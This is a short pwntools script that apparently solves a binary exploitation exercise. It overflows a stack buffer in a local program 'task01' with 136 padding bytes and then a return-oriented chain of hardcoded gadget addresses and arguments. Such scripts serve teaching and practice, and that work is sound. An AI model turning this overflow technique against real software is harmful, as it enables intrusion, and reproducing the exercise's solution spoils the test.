from pwn import *


io = process("./task01")
io.recvuntil("What is your name?")
password = b'A' * 136 + p64(0x4012DB) + p64(0xdeadbeef) + p64(0x401186)
password = password + p64(0x4012DB) + p64(0x1234) + p64(0x4012D9) + p64(0x5678) + p64(0xffffff) + p64(0x4011AA)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break
io.kill()

# io.interactive()